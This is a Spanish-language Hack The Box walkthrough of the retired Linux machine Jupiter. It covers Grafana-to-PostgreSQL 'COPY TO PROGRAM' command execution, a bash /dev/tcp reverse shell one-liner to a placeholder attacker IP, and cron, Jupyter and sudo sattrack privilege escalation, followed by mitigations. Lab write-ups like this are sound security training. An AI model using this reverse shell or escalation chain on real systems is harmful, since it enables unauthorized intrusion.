---
machine: Jupiter
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, grafana, postgresql, copy-program, jupyter, sattrack]
---

# Jupiter — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Grafana permite consultas SQL arbitrarias contra PostgreSQL; `COPY ... FROM PROGRAM` ejecuta comandos como `postgres`. Un cron de Shadow Simulator lleva a `juno`, Jupyter a `jovian` y `sudo sattrack` con una configuración manipulable cierra la escalada.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,3000,5432,8888 <IP>
# Grafana -> datasource PostgreSQL
psql -h 127.0.0.1 -U postgres -d postgres
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"';
# Pivote
pspy64 -pf -i 1000
sudo -l
sudo sattrack --config http://<IP>/config.json
```

## Enumeración

- Grafana con datasource PostgreSQL y consultas raw habilitadas.
- Un cron de Shadow Simulator con archivos de configuración escribibles.
- Jupyter accesible con credenciales reutilizadas y `sattrack` en sudo.

## Acceso inicial

El datasource permite `COPY (SELECT '') TO PROGRAM '...'`; PostgreSQL ejecuta el comando como su usuario. Se lanza una reverse shell y se obtiene una sesión como `postgres`.

## Escalada de privilegios

Un cron de Shadow Simulator procesa una configuración que se puede modificar y ejecuta comandos como `juno`. Desde ahí, Jupyter permite ejecutar como `jovian`; `sudo sattrack` acepta una URL de configuración y escribe en una ruta de root.

## Evidencia

- Consulta `COPY ... PROGRAM` ejecutada desde Grafana.
- Shell como `postgres` y pivote a `juno`.
- `sudo sattrack` con configuración controlada y shell de root.

## Lecciones aprendidas

- Un datasource SQL puede ser ejecución de comandos en el servidor.
- Los crons que leen configuración escribible son una escalada directa.
- Las herramientas con `sudo` que aceptan URLs o archivos amplían la superficie.

## Mitigación y detección

- Deshabilitar consultas raw y limitar el usuario de PostgreSQL.
- Montar configuraciones de cron como solo lectura.
- Restringir `sattrack` y validar sus fuentes de configuración.

## Referencias

- [0xdf — Jupiter](https://0xdf.gitlab.io/2023/10/21/htb-jupiter.html)
- [PostgreSQL — COPY](https://www.postgresql.org/docs/current/sql-copy.html)
- [Hack The Box — Jupiter](https://app.hackthebox.com/machines/jupiter)
